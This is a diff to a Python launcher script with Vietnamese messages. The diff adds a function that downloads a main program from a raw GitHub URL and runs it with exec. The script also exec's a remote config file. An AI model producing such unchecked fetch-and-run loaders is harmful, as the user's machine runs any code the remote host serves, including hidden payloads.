@@ -1,14 +1,7 @@
 # -*- coding: utf-8 -*-
 import os
 import sys
-import json
-import random
-import string
 import requests
-import hashlib
-import ast
-from datetime import datetime, timedelta, date
-from time import sleep
 
 gl_mc = "\033[1;0m ➲ "
 gl_mc1 = "\033[1;0m==> "
@@ -38,17 +31,15 @@ BANNER = """
 
 # -------------------- Config API --------------------
 CONFIG_URL = "https://raw.githubusercontent.com/Manhcuongdzcuti/Manhcuongdzcuti/refs/heads/main/config.py"
+TOOL_URL   = "https://raw.githubusercontent.com/manhcuongsieucute2k9-lang/Golikemcne/refs/heads/main/main.py"
 
 def load_remote_config():
-    """
-    Tải config.py từ GitHub và parse thành dict
-    """
     try:
         res = requests.get(CONFIG_URL, timeout=7)
         res.raise_for_status()
         code = res.text
         cfg = {}
-        exec(code, cfg)  # chạy code Python trên server
+        exec(code, cfg)
         return {
             "TOOL_STATUS": cfg.get("TOOL_STATUS", "on"),
             "UPDATE_MESSAGES": cfg.get("UPDATE_MESSAGES", [])
@@ -58,22 +49,27 @@ def load_remote_config():
         return {"TOOL_STATUS": "on", "UPDATE_MESSAGES": []}
 
 def check_tool_status():
-    """
-    Kiểm tra trạng thái tool (bảo trì hay hoạt động).
-    Nếu bảo trì -> in thông báo và thoát.
-    """
     config = load_remote_config()
 
-    # Hiển thị thông báo từ server
     if config["UPDATE_MESSAGES"]:
         print("\033[1;32m════════════════════════════════════════════════════════════")
         for msg in config["UPDATE_MESSAGES"]:
             print(gl_mc + "\033[1;33m" + msg)
         print("\033[1;32m════════════════════════════════════════════════════════════")
 
-    # Kiểm tra trạng thái bảo trì
     if config["TOOL_STATUS"].lower() != "on":
         print("\n❌ Tool đang bảo trì, vui lòng quay lại sau!")
+        sys.exit(1)
+
+# -------------------- Run Tool From API --------------------
+def run_remote_tool():
+    try:
+        res = requests.get(TOOL_URL, timeout=10)
+        res.raise_for_status()
+        code = res.text
+        exec(code, globals())
+    except Exception as e:
+        print(f"❌ Lỗi tải tool từ server: {e}")
         sys.exit(1)
 
 # -------------------- Main --------------------
@@ -81,11 +77,10 @@ def main():
     os.system('cls' if os.name=='nt' else 'clear')
     print(BANNER)
 
-    # Kiểm tra trạng thái tool & thông báo
     check_tool_status()
 
-    # TODO: phần chạy tool chính ở đây
-    print(gl_mc + "\033[1;32mTool sẵn sàng hoạt động!")
+    print(gl_mc + "\033[1;32mĐang tải tool từ server...\n")
+    run_remote_tool()
 
 if __name__ == "__main__":
     try:
